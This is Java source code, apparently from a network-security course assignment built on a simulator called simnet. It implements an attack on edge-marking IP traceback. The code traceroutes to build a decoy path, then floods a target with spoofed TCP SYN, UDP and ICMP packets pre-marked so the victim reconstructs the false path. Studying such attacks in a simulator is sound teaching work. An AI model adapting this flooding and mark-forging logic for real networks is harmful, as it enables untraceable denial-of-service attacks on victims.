package A0;

import simnet.*;
import java.util.*;

/** An application that implements an attack that defeats edge marking traceback. */
public class TracebackAttack extends Application implements BPFConsumer,Pluggable {
	/** Original Traceroute variables. */
	private boolean running = true;
	private boolean noresponse = true;
	private int resp_src = -1;
	private BPF bpf = null;
	private int last_ipid;

	/** Attack variables. */
	double p = 0.04;
	Vector fake_attack_path;

	/** Attack methods. */
	public void ta(String src, Integer src_port, String dest, Integer dest_port, Integer proto, Integer total, Integer src_perc, Integer dest_perc, Integer proto_perc) {
		/** Reset fake attack path. */
		fake_attack_path = new Vector();

		/** Look up source and destination ID's. */
		int src_id = sim.lookup(src);
		int dest_id = sim.lookup(dest);

		/** Use traceroute to build fake attack path. */
		ta_traceroute(src_id);

		/** Create packets, mark them to create fake attack path, and send them. */
		ta_flood(src_id, src_port.intValue(), dest_id, dest_port.intValue(), proto.intValue(), total.intValue(), src_perc.intValue(), dest_perc.intValue(), proto_perc.intValue());
	}

	/** Traceroute methods. */

	/** Modified Traceroute tracing method, builds list of nodes on fake attack path. */
	public void ta_traceroute(int dest) {
		long start, end;

		if(dest == node.id) { return; }

		synchronized (this) {
			if (bpf != null) { return; }

			bpf = new BPF(-1, node.id, Simnet.PROTO_ICMP, -1, this);
			node.addBPF(bpf, Simnet.IN, -1);
		}

		int count = 0;

		running = true;

		while(running && count<30) {
			count++;
			String out = "";
			resp_src = -1;

			for(int i = 0; i < 3; i++) {
				UDP_Packet udpp = new UDP_Packet();
				udpp.src_port = 1025;
				udpp.dest_port = 1200;
				udpp.data = null;

				IP_Packet ipp = new IP_Packet();
				ipp.src = node.id;
				ipp.dest = dest;
				ipp.protocol = Simnet.PROTO_UDP;
				ipp.ipid = random.nextInt();
				ipp.data = udpp;
				ipp.ttl = count;

				start = System.currentTimeMillis();

				synchronized(this){
					last_ipid = ipp.ipid;
					rawOut(ipp);
					noresponse = true;

					try { wait(1000); }
					catch(InterruptedException ie) {}

					end = System.currentTimeMillis();

					if (noresponse) { out += "  *"; }
					else { out += "  " + (end - start) + "ms"; }
				}
			}

			if (resp_src != -1) { out = node.lookup(resp_src) + "(" + Utils.getStringFromIP(resp_src) + ")" + out; }
			else { running = false; }

			/** Add node to fake attack path. */
			fake_attack_path.add(new Integer(resp_src));
		}

		synchronized (this) {
			node.removeBPF(bpf, Simnet.IN, -1);
			bpf = null;
		}
	}

	/** Modified Traceroute prePlugout method, updated message for traceback attack implementation. */
	public synchronized boolean prePlugout(Object replacement) {
		if (bpf != null) {
			node.printout(0, node.id, "Cannot remove traceback attack application while a traceback attack is in progress.");
			return false;
		} else { return true; }
	}

	/** Original Traceroute inBPF method. */
	public synchronized void inBPF(int bpf_id, IP_Packet ip_packet) {
		ICMP_Packet icmpp = (ICMP_Packet) ip_packet.data;
		if (!check(icmpp)) { return; }

		if(icmpp.type == Simnet.ICMP_TIME_EXCEEDED) {
			noresponse = false;
			resp_src = ip_packet.src;
			notifyAll();
		}
		else if(icmpp.type == Simnet.ICMP_DEST_UNREACHABLE && icmpp.code == Simnet.CODE_PORT_UNREACHABLE) {
			running = false;
			noresponse = false;
			resp_src = ip_packet.src;
			notifyAll();
		}

	}

	/** Original Traceroute check method. */
	protected boolean check(ICMP_Packet icmpp) {
		if (icmpp.data == null) { return false; }

		if (icmpp.data instanceof IP_Packet) {
			IP_Packet ipp = (IP_Packet) icmpp.data;
			return (ipp.ipid == last_ipid);
		}

		return false;
	}

	/** PacketGenerator methods. */

	/** Modified PacketGenerator flood method, marks packets to create fake attack path. */
	public void ta_flood(int src, int src_port, int dest, int dest_port, int proto, int total, int src_perc, int dest_perc, int proto_perc) {
		IP_Packet ipp;

		for (int i = 0; i < total; i++) {
			ipp = new IP_Packet();

			ipp.src = src;
			ipp.dest = dest;
			ipp.ipid = i;
			ipp.ttl = 32;
			ipp.protocol = Simnet.PROTO_TCP;

			/**
			* Iterate through nodes on fake attack path.
			* At each one, perform marking procedure on IP packet.
			* This tricks the victim into reconstructing the fake attack path.
			*/
			for (int index = fake_attack_path.size() - 2; index > 0; index--) {
				int id = ((Integer) fake_attack_path.get(index)).intValue();

				double x = random.nextDouble();

				if (x < p) {
					ipp.trace = id;
					ipp.distance = 0;
				}
				else {
					if (ipp.distance == 0) { ipp.trace = id ^ ipp.trace; }
					if (ipp.distance >= 0) { ipp.distance++; }
				}
			}

			if (random.nextInt(100) < src_perc) { ipp.src = random.nextInt(); }
			if (random.nextInt(100) < dest_perc) { ipp.dest = random.nextInt(); }

			if (random.nextInt(100) < proto_perc) {
				int temp = random.nextInt(3);

				if (temp == 0) {
					TCP_Packet tcpp = new TCP_Packet();
					tcpp.dest_port = dest_port;
					tcpp.src_port = src_port;
					tcpp.SYN = true;
					ipp.protocol = Simnet.PROTO_TCP;
					ipp.data = tcpp;
				}
				else if (temp == 1) {
					UDP_Packet udpp = new UDP_Packet();
					udpp.dest_port = dest_port;
					udpp.src_port = src_port;
					ipp.protocol = Simnet.PROTO_UDP;
					ipp.data = udpp;
				}
				else if (temp == 2) {
					ICMP_Packet icmpp = new ICMP_Packet();
					icmpp.type = Simnet.ICMP_ECHO_REQUEST;
					icmpp.code = 0;
					ipp.protocol = Simnet.PROTO_ICMP;
					ipp.data = icmpp;
				}

			} else {
				if (proto == Simnet.PROTO_UDP) {
					UDP_Packet udpp = new UDP_Packet();
					udpp.dest_port = dest_port;
					udpp.src_port = src_port;
					ipp.protocol = Simnet.PROTO_UDP;
					ipp.data = udpp;
				} else if (proto == Simnet.PROTO_ICMP) {
					ICMP_Packet icmpp = new ICMP_Packet();
					icmpp.type = Simnet.ICMP_ECHO_REQUEST;
					icmpp.code = 0;
					ipp.protocol = Simnet.PROTO_ICMP;
					ipp.data = icmpp;
				} else {
					TCP_Packet tcpp = new TCP_Packet();
					tcpp.dest_port = dest_port;
					tcpp.src_port = src_port;
					tcpp.SYN = true;
					ipp.protocol = Simnet.PROTO_TCP;
					ipp.data = tcpp;
				}
			}

			rawOut(ipp);
		}
	}
}